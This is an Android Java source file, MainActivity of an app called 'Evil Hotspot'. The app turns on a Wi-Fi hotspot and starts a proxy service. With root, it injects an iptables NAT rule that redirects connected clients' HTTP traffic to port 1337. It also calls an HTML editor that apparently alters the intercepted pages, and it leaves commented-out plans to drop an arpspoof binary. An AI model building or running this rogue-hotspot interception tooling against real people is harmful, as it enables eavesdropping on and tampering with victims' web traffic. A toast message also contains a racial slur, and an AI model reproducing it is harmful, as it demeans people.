package android.evilhotspot;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.evilhotspot.proxy.HTMLEditor;
import android.evilhotspot.proxy.proxyService;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.StrictMode;
import android.support.v4.app.NotificationCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.Toast;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

//List of android permissions:
//http://developer.android.com/reference/android/Manifest.permission.html

//How to get root permissions (will work only on rooted device/emulator:
//http://www.stealthcopter.com/blog/2010/01/android-requesting-root-access-in-your-app/

//Instructions how to get a adb shell on device
//http://android.stackexchange.com/questions/69108/how-to-start-root-shell-with-android-studio

//Phone saying "Read-only file system" when attempting to create a file in /system
//http://stackoverflow.com/questions/6066030/read-only-file-system-on-android
//# mount -o rw,remount /system  <-> # mount -o ro,remount /system

//PCAP ? not used in the app so far...:
//http://stackoverflow.com/questions/15557831/android-use-pcap-library

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    final static String TAG = "MainActivity";

    public static Button hsButton ;
    //MyApplication instance = new MyApplication(this);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        //Create an ApManager to turn hotspot on and off
        ApManager ap = new ApManager();
        //Register our buttons OnClickListener
        hsButton = (Button) findViewById(R.id.hsButton);
        hsButton.setOnClickListener(this);
        Button rtButton = (Button) findViewById(R.id.rtButton);
        rtButton.setOnClickListener(this);
        Button htmlButton = (Button) findViewById(R.id.htmlbutton);
        htmlButton.setOnClickListener(this);
        Button ruleButton = (Button) findViewById(R.id.iptablesButton);
        ruleButton.setOnClickListener(this);

        MyApplication myapp= new MyApplication(this);

        try {
            Context context = getApplicationContext();
            WifiManager wifiManager = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
            Method getConfigMethod = wifiManager.getClass().getMethod("getWifiApConfiguration");
            WifiConfiguration wifiConfig = (WifiConfiguration) getConfigMethod.invoke(wifiManager);
            
            if (ApManager.isApOn()) {
                //Button btn = MainActivity.hsButton;
                hsButton.setBackgroundResource(R.drawable.button_on);
                //when you have default seetings and switch off and on app in MainActivity then checkbox is checked, (default seetings on)
                if (wifiConfig.SSID.equals("AndroidAP")) {
                    ApManager.isCheckBoxChecked = true;
                }
                //ApManager.isCheckBoxChecked=false;
                else if (!wifiConfig.SSID.equals("AndroidAP")) {
                    ApManager.isCheckBoxChecked = false;
                }
            } else if (!ApManager.isApOn()) {
                //Button btn = MainActivity.hsButton;
                hsButton.setBackgroundResource(R.drawable.button_off);
                if (wifiConfig.SSID.equals("AndroidAP")) {
                    ApManager.isCheckBoxChecked = true;
                }
                //ApManager.isCheckBoxChecked=false;
                else if (!wifiConfig.SSID.equals("AndroidAP")) {
                    ApManager.isCheckBoxChecked = false;
                }
            }
        }
        catch(Exception e){
            e.printStackTrace();
        }
        //Log.e("MyTemp", netInterface.getDisplayName());
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        //serverStatus = (TextView) findViewById(R.id.serverStatusView);
        //serverStatus.setTextColor(Color.parseColor("#F5DC49"));

        //set up ApManager and make sure we start with AP off
        ApManager.setUp(getApplicationContext());
    }


    boolean isAPoff = true;
    public void onClick(View v) {
        // default method for handling onClick Events for our MainActivity
        switch (v.getId()) {

            case R.id.hsButton:
                Log.d("BUTTONS", "hotspot button pressed");
                //if HS button was pressed turn on/off hotspot
                hsPressed();
                break;
            case R.id.htmlbutton:
                Log.d("BUTTONS", "html test button pressed");
                HTMLEditor.Reader(this.getApplicationContext());
                break;
            case R.id.rtButton:
                Log.d("BUTTONS", "root test button pressed");
                rtPressed();
                break;
            case R.id.iptablesButton:
                Log.d("BUTTONS", "inject rule button pressed");
                iptablesRulePressed((Button) findViewById(R.id.iptablesButton));
                break;
        }
    }

    //change current state of mobile hotspot
    private void hsPressed(){
        //Part for switching img of main button & enable/disable checkbox default
        Context context = MainActivity.this;
        //WifiManager wifimanager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        try {
            WifiManager wifiManager = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
            Method getConfigMethod = wifiManager.getClass().getMethod("getWifiApConfiguration");
            WifiConfiguration wifiConfig = (WifiConfiguration) getConfigMethod.invoke(wifiManager);

            if (!ApManager.isApOn()) {
                hsButton.setBackgroundResource(R.drawable.button_on);
                startService(new Intent(this, proxyService.class));

                if (wifiConfig.SSID.equals("AndroidAP")) {
                    ApManager.isCheckBoxChecked = true;
                }
                //ApManager.isCheckBoxChecked=false;
                else if (!wifiConfig.SSID.equals("AndroidAP")) {
                    ApManager.isCheckBoxChecked = false;
                }
            }
            //WIFI IS ON Make OFF
            else if (ApManager.isApOn()) {
                hsButton.setBackgroundResource(R.drawable.button_off);
                stopService(new Intent(this, proxyService.class));
                if (wifiConfig.SSID.equals("AndroidAP"))  {
                    ApManager.isCheckBoxChecked = true;
                }
                //ApManager.isCheckBoxChecked=false;
                else if (!wifiConfig.SSID.equals("AndroidAP"))  {
                    ApManager.isCheckBoxChecked = false;
                }
            }
        }
        catch(Exception e){
            e.printStackTrace();
        }
        ApManager.configApState();
        //for changing button looks when pressed
    }

    //try to do something as root (root test)
    private void rtPressed(){
        //if root test was pressed attempt to do something as root
        ShellExecutor exe = new ShellExecutor();


        if (exe.isRootAvailable()){
            toastMessage("We got root niggah!");
        }
        else{
            if (exe.RunAsRootOutput("busybox id -u").equals("0")) {
                toastMessage("We got root niggah!");
            }

            else
                toastMessage("We don't have root buddy...");
        }
            //arpspoof (attempting to run a C program, build with NDK)
            //get resource handle
            //InputStream raw = getResources().openRawResource(R.raw.arpspoof);
            //saveFile("arpspoof", raw);
            //os.writeBytes("chmod 700 /data/data/android.evilhotspot/files/arpspoof\n");
    }
    //for saving embedded raw binary blob as file that can be run on filesystem
    public int saveFile(String filename, InputStream raw){
        try {
            FileOutputStream fos = openFileOutput(filename, Context.MODE_PRIVATE);
            int readbyte = 0;
            while(true) {
                readbyte = raw.read();
                if(readbyte == -1) break;
                fos.write(readbyte);
            }
            fos.close();
            return 0;
        }
        catch( Exception e){
            e.printStackTrace();
            return 1;
        }
    }
    //inject/remove iptables rule that will route http traffic to our app
    private int iptablesRulePressed(Button ruleButton){
        ShellExecutor exe = new ShellExecutor();
        //check if rule exists, if yea, remove it, if no insert it
        if ( ! exe.doesRuleExists()) {
            if (exe.RunAsRoot("iptables -t nat -I PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")) {
                ruleButton.setBackgroundResource(R.drawable.remove_rule);
                toastMessage("Success");
            }
            else
                toastMessage("Failed");
        }
        else {
            if (exe.RunAsRoot("iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")){
                ruleButton.setBackgroundResource(R.drawable.inject_rule2);
                toastMessage("Success");
            }
            else
                toastMessage("Failed");
        }
        return 0;
    }
    //function for debugging etc. (shows toast with msg text)
    public void toastMessage(String msg){
        Context context = getApplicationContext();
        int duration = Toast.LENGTH_SHORT;
        Toast toast = Toast.makeText(context, msg, duration);
        toast.show();
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            startActivity(new Intent(this,SettingsActivity.class));
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    public static void notification(Context context){

        Intent intent = new Intent(context, MainActivity.class);
        PendingIntent pIntent = PendingIntent.getActivity(context, (int) System.currentTimeMillis(), intent, 0);

        Notification n  = new Notification.Builder(context)
                .setContentTitle("Evil Hotspot")
                .setContentText("Click here, let's start a havoc!")
                .setSmallIcon(R.drawable.logo)
                .setContentIntent(pIntent)
                .setAutoCancel(true).build();



        NotificationManager notificationManager =
                (NotificationManager) context.getSystemService(NOTIFICATION_SERVICE);

        notificationManager.notify(0, n);
    }
    public static void cleannotif(Context context){
        NotificationManager notificationManager = (NotificationManager)context.getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.cancelAll();
    }
    @Override
    protected void onResume() {
        super.onResume();
        MyApplication.activityResumed();
    }
    @Override
    protected void onPause() {
        super.onPause();
        MyApplication.activityPaused();
    }
}
